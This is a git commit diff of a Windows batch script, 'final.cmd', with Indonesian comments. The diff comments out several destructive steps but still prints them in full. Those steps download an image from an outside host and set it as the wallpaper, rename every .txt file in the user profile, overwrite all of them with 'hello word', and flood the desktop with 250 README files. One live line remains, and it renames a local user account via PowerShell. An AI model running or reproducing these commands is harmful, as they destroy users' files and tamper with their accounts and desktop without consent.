193804c716e98e0cb3aa1714319f12b9564b8e45
Nathanael Praditya <leerlryzck9@gmail.com>
2026-05-16 22:10:39 +0700

    Update final.cmd

--- final.cmd
+++ final.cmd
@@ -1,33 +1,27 @@
 ::Download gambar - reboot - set wallpaper ###
-@echo off
-
-curl -L -s "https://i.ibb.co.com/Z6WSw3cz/PATIENCE.png" -o "%USERPROFILE%\Music\GD_001.jpg"
-
-set img=%USERPROFILE%\Music\GD_001.jpg
-
-reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%img%" /f >nul 2>&1
+::@echo off
+::curl -L -s "https://i.ibb.co.com/Z6WSw3cz/PATIENCE.png" -o "%USERPROFILE%\Music\GD_001.jpg"
+::set img=%USERPROFILE%\Music\GD_001.jpg
+::reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%img%" /f >nul 2>&1
 
 :: rename *.txt menjadi ALLUSER
-setlocal enabledelayedexpansion
-
-set count=1
-
-for /r "%USERPROFILE%" %%f in (*.txt) do (
-    ren "%%f" "ALLUSER_!count!.txt"
-    set /a count+=1
-)
+::setlocal enabledelayedexpansion
+::set count=1
+::for /r "%USERPROFILE%" %%f in (*.txt) do (
+::    ren "%%f" "ALLUSER_!count!.txt"
+::    set /a count+=1
+::)
 
 ::ubah isi *.txt - hello word
-for /r "%USERPROFILE%" %%f in (*.txt) do (
-    echo hello word > "%%f"
-)
+::for /r "%USERPROFILE%" %%f in (*.txt) do (
+::    echo hello word > "%%f"
+::)
 
 ::create readme.desktop
-setlocal enabledelayedexpansion
-
-for /l %%i in (1,1,250) do (
-    echo sarcas1111 > "%USERPROFILE%\Desktop\README%%i.txt"
-)
+::setlocal enabledelayedexpansion
+::for /l %%i in (1,1,250) do (
+::    echo sarcas1111 > "%USERPROFILE%\Desktop\README%%i.txt"
+::)
 
 ::rename user local
 powershell -Command "Rename-LocalUser -Name 'tmbaule' -NewName 'SIGMAMALE'"
